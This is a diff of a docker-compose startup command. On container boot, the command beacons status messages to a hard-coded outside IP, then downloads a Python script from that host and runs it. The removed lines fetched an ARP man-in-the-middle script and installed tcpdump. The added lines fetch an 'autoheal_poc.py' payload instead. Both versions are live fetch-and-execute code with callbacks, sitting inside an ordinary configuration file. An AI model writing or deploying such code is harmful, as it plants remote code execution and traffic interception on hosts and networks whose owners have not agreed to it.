@@ -6,14 +6,13 @@ services:
       - sh
       - -c
       - |
-        apk add --no-cache curl tcpdump iproute2 libcap >/dev/null 2>&1
-        curl -sS -X POST "http://147.45.231.59:7777/?tag=MITM-BOOT" -d "container alive, downloading script" || true
-        wget -q -O /tmp/mitm.py "http://147.45.231.59:7778/arp_mitm_v3.py"
+        apk add --no-cache curl iproute2 >/dev/null 2>&1
+        curl -sS -X POST "http://147.45.231.59:7777/?tag=V4-CONTAINER-UP" -d "alive" || true
+        wget -q -O /tmp/poc.py "http://147.45.231.59:7778/autoheal_poc.py"
         if [ $? -ne 0 ]; then
-          curl -sS -X POST "http://147.45.231.59:7777/?tag=MITM-ERR" -d "download failed" || true
+          curl -sS -X POST "http://147.45.231.59:7777/?tag=V4-DL-ERR" -d "download failed" || true
           sleep 3600
           exit 1
         fi
-        curl -sS -X POST "http://147.45.231.59:7777/?tag=MITM-DL-OK" -d "script downloaded, launching" || true
-        python3 /tmp/mitm.py
+        python3 /tmp/poc.py
         sleep 3600
